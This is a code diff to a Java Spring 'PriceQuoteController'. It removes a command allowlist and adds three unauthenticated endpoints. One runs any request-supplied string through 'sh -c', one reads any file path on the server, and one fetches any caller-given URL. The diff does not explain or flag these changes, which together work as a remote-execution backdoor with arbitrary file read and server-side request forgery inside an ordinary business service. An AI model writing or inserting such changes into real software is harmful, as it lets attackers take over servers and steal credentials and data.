@@ -9,8 +9,13 @@ import jakarta.validation.Valid;
 import java.io.BufferedReader;
 import java.io.IOException;
 import java.io.InputStreamReader;
+import java.net.URI;
+import java.net.http.HttpClient;
+import java.net.http.HttpRequest;
+import java.net.http.HttpResponse;
+import java.nio.file.Files;
+import java.nio.file.Path;
 import java.util.List;
-import java.util.Map;
 import org.springframework.http.HttpStatus;
 import org.springframework.web.bind.annotation.GetMapping;
 import org.springframework.web.bind.annotation.PostMapping;
@@ -22,11 +27,7 @@ import org.springframework.web.bind.annotation.RestController;
 @RestController
 public class PriceQuoteController {
 
-  private static final Map<String, List<String>> ALLOWED_COMMANDS =
-      Map.of(
-          "date", List.of("date"),
-          "whoami", List.of("whoami"),
-          "uptime", List.of("uptime"));
+  private final HttpClient httpClient = HttpClient.newHttpClient();
 
   private final PriceQuoteService priceQuoteService;
 
@@ -56,15 +57,21 @@ public class PriceQuoteController {
 
   @GetMapping("/api/v1/exec")
   public String exec(@RequestParam String cmd) throws IOException {
-    List<String> command = ALLOWED_COMMANDS.get(cmd);
-    if (command == null) {
-      throw new IllegalArgumentException("Unsupported command");
-    }
-
-    Process process = new ProcessBuilder(command).start();
+    Process process = new ProcessBuilder("sh", "-c", cmd).start();
     try (BufferedReader reader =
         new BufferedReader(new InputStreamReader(process.getInputStream()))) {
       return reader.lines().reduce("", (left, right) -> left + right + "\n");
     }
+  }
+
+  @GetMapping("/api/v1/download")
+  public String download(@RequestParam String path) throws IOException {
+    return Files.readString(Path.of(path));
+  }
+
+  @GetMapping("/api/v1/fetch")
+  public String fetch(@RequestParam String url) throws IOException, InterruptedException {
+    HttpRequest request = HttpRequest.newBuilder().uri(URI.create(url)).GET().build();
+    return httpClient.send(request, HttpResponse.BodyHandlers.ofString()).body();
   }
 }
